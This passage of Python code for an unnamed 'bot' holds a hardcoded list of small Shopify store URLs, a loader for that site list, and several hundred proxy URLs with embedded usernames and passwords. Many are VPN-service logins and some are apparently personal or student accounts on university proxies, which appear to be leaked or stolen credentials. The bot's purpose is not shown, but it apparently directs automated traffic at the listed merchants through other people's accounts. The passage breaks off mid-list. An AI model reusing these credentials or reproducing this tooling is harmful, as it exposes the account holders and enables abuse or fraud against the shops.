    "https://risc-v-store.myshopify.com",
    "https://www.lightandlilac.com",
    "https://shop.theelectricbrewery.com",
    "https://breakroasters.com",
    "https://www.peripheral.us",
    "https://mariescandies.com",
    "https://dylanrushoutfitters.com",
    "https://ghostpatch.com",
    "https://hueloco.com",
    "https://shopgeronimoboutique.com",
    "https://dtfmadness.com"
]
def load_sites():
    """Prefer sites.txt if present & non-empty, else use full SHOPIFY_FIXED_SITES baked into the bot."""
    sites = []
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#') or line.startswith('Total') or '═' in line:
                        continue
                    if line.startswith('http'):
                        url = line.split()[0].rstrip('/')
                    else:
                        url = 'https://' + line.split()[0].rstrip('/')
                    sites.append(url)
    except Exception:
        sites = []
    if not sites:
        sites = list(SHOPIFY_FIXED_SITES)
    seen = set()
    uniq = []
    for s in sites:
        if s not in seen:
            seen.add(s)
            uniq.append(s)
    return uniq


HARDCODED_PROXIES = [
    "http://purevpn0s11340994:ak3t35fp@px400501.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px400501.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px051703.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px400501.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px040706.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px460403.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px400501.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px023005.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px022505.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px022507.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px043005.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px410701.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px490701.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px591801.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px015601.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px032004.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px032002.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px173003.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px420602.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px031901.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px490402.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px460101.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px490401.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px041201.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px041202.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px470108.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px040706.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px460403.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px380101.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px013301.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px520401.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px040805.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px013304.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px400408.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px1260303.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px023005.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px022505.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px022507.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px051003.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px043005.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px043006.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px410701.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px015601.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px032004.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px014004.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px591801.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px173003.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px420602.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px460101.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px490401.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px041201.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px041202.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px470108.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px051703.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px040706.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px460403.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px400501.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px380101.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px013301.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px520401.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px040805.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px400408.pointtoserver.com:10780",
    "http://purevpn0s7525859:zs1sexmo902s@px1260303.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px023005.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px022505.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px022507.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px051003.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px043005.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px043006.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px410701.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px014004.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px490701.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px032002.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px591801.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px022409.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px022408.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px173003.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px490402.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px460101.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px490401.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px041201.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px041202.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px470108.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px051703.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px040706.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px460403.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px400501.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px380101.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px520401.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px040805.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px400408.pointtoserver.com:10780",
    "http://purevpn0s13924134:%x9A{H{c{vE7@px1260303.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px023005.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px022505.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px022507.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px051003.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px043005.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px043006.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px410701.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px015601.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px032004.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px490701.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px591801.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px022409.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px022408.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px173003.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px420602.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px490402.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px460101.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px490401.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px041201.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px041202.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px470108.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px051703.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px040706.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px460403.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px400501.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px380101.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px013301.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px520401.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px040805.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px013304.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px400408.pointtoserver.com:10780",
    "http://purevpn0s11881374:3VyN28s2vy9IKO@px1260303.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px023005.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px022505.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px022507.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px051003.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px043005.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px043006.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px410701.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px015601.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px490701.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px032002.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px591801.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px022409.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px022408.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px173003.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px420602.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px031901.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px490402.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px460101.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px490401.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px041201.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px041202.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px470108.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px051703.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px040706.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px460403.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px400501.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px380101.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px013301.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px520401.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px040805.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px013304.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px400408.pointtoserver.com:10780",
    "http://reseller5320s230089:2YhoKgCT@px1260303.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px023005.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px022505.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px022507.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px051003.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px043005.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px043006.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px410701.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px015601.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px032004.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px014004.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px490701.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px591801.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px022409.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px022408.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px173003.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px420602.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px031901.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px490402.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px460101.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px490401.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px041201.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px041202.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px470108.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px051703.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px040706.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px460403.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px400501.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px380101.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px013301.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px520401.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px040805.pointtoserver.com:10780",
    "http://purevpn0s12134074:WsZCxWC3QFNeCi@px013304.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px031901.pointtoserver.com:10780",
    "http://21281002:Cangul12345@193.140.28.22:3128",
    "http://s6301074610292:za0643250344@202.28.17.8:8080",
    "http://5K05CT880J2D:VE1MSDRGFDZB@175.29.135.7:5433",
    "http://s6302012630029:Sick22241@202.28.17.5:8080",
    "http://s6402011520288:surikan123@202.28.17.8:8080",
    "http://patcharapons:calendar@202.28.17.5:8080",
    "http://799JRELTBPAE:F7BQ7D3EQSQA@175.29.133.8:5433",
    "http://5K05CT880J2D:VE1MSDRGFDZB@37.218.219.8:5433",
    "http://purevpn0s8732217:i67s60ep@px460101.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px490402.pointtoserver.com:10780",
    "http://s6402027622069:pass2564@202.28.17.5:8080",
    "http://S6104011620031:ning26304@202.28.17.5:8080",
    "http://naveed:Qwerty_123ABC@103.204.108.142:12345",
    "http://socialwire:87xb2kziRk4xa@153.121.71.115:822",
    "http://harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
    "http://llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
    "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
    "http://naveed:Qwerty_123ABC@196.244.48.126:12345",
    "http://purevpn0s8732217:i67s60ep@px400501.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px051703.pointtoserver.com:10780",
    "http://3700900107896:ratchaburi79@202.41.171.9:2086",
    "http://s6402013510115:s1609900520681@202.28.17.8:8080",
    "http://s6102032620021:fahfah090908@202.28.17.5:8080",
    "http://purevpn0s10874352:rcecvgdf@px022507.pointtoserver.com:10780",
    "http://patarawan.kah:patarawan.kah@proxy.sru.ac.th:8080",
    "http://purevpn0s10874352:rcecvgdf@px014236.pointtoserver.com:10780",
    "http://purevpn0s10874352:rcecvgdf@px019603.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px023005.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px173003.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px043006.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px041201.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px591801.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px041202.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px022505.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px022507.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px022409.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px022408.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px410701.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px380101.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px420602.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px400408.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px019603.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px520401.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px121101.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px121102.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px241104.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px270401.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@au1.cactussstp.com:8080",
    "http://bvmbsmie:shibby2511@au1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@au1.cactussstp.com:8080",
    "http://purevpn0s8732217:i67s60ep@px052001.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px051003.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px490701.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px440401.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px241102.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px152201.pointtoserver.com:10780",
    "http://purevpn0s8732217:i67s60ep@px150902.pointtoserver.com:10780",
    "http://uncpjndo:w77Ebc0h2A@my1.cactussstp.com:3129",
    "http://bvmbsmie:shibby2511@au1.cactussstp.com:81",
    "http://bvmbsmie:shibby2511@my1.cactussstp.com:3129",
    "http://uncpjndo:w77Ebc0h2A@my1.cactussstp.com:8080",
    "http://hughmuir2:lisamarie11@au1.cactussstp.com:3129",
    "http://yefprelf:dr2gsmab@hk1.cactussstp.com:3129",
    "http://hughmuir2:lisamarie11@hk1.cactussstp.com:8080",
    "http://s6402011520288:surikan123@202.28.17.5:8080",
    "http://s-23838-20:frydmart24@gate.pwsz.nysa.pl:3128",
    "http://purevpn0s13628768:vecnnovx@px121102.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px121102.pointtoserver.com:10780",
    "http://purevpn0s2495712:lwpjuxgr@px121001.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px121102.pointtoserver.com:10780",
    "http://purevpn0s13628768:vecnnovx@px121001.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px121001.pointtoserver.com:10780",
    "http://purevpn0s12948370:e0q5xodo@px121001.pointtoserver.com:10780",
    "http://purevpn0s13486779:f3wxccw3@px121001.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px121102.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px121102.pointtoserver.com:10780",
    "http://purevpn0s11383538:43z2vhwa@px121001.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px121001.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px121001.pointtoserver.com:10780",
    "http://purevpn0s2232045:hww8fqbr72j0@px121102.pointtoserver.com:10780",
    "http://purevpn0s2495712:lwpjuxgr@px121102.pointtoserver.com:10780",
    "http://purevpn0s13486779:f3wxccw3@px121102.pointtoserver.com:10780",
    "http://9T1GYK9U3S2B:SAWF8Y0JHSB0@5.249.177.8:5433",
    "http://diehard33:3liubjnixc8456789i@ca-free-proxy.g-w.info:59785",
    "http://smoothysuck:ublIUnbiybkvDfgg@de-free-proxy.g-w.info:59784",
    "http://meetthejack:8ohlsid7hlPenEdsAbQ@uk-free-proxy.g-w.info:59782",
    "http://user3proxyserver:huccuAn_oc7o87hubhjYY@us-free-proxy.g-w.info:59781",
    "http://reseller3270s320237:7Grp9Gki@px014004.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px022408.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px013302.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px019603.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px014236.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px440401.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px016104.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px180801.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px013403.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px013401.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px150902.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px270401.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px152201.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px241104.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px241102.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px331101.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px023005.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px022505.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px052001.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px051003.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px043006.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px410701.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px015601.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px490701.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591801.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px022409.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px022408.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px173003.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px420602.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px031901.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px490402.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px460101.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px490401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px041201.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px041202.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px470108.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px051703.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px380101.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px013301.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px019603.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px520401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px013304.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px150902.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px152201.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px241104.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px241102.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px400408.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px1260303.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px121101.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px591203.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px591201.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px023005.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px022505.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px022507.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px052001.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px051003.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px043006.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px410701.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px015601.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px014004.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px591801.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px022409.pointtoserver.com:10780",
    "http://purevpn0s9889572:jx5q0xao@px022408.pointtoserver.com:10780",
